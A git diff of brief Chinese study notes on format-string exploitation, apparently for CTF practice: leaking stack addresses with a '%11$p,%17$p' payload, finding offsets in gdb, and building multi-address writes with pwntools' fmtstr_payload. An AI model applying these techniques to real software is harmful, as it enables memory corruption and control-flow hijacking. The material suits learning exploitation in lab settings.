@@ -1,11 +1,12 @@
 套路
+fmt 修改的是偏移的 地址->指针->val , 不是直接 地址->val
+
 1. 泄露栈修改返回值, 先泄露个栈地址
 
-
-1. 可以一次泄露多个目标值
+1) 可以一次泄露多个目标值
    sla('Now answer me, will you v me 50\n','aaaaaaa,%11$p,%17$p')
 
-2. 计算偏移值
+2) 计算偏移值
 
 ```sh
 format_level1 为例，
@@ -32,6 +33,7 @@ gdb$ fmtarg 0xffffd33c  -> 7 ("\%6$p") 也是7
 ```
 
 3
+
 ```sh
 # 修改多值写法
 fmtstr_payload(10, {0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef}, no_dollars=True)
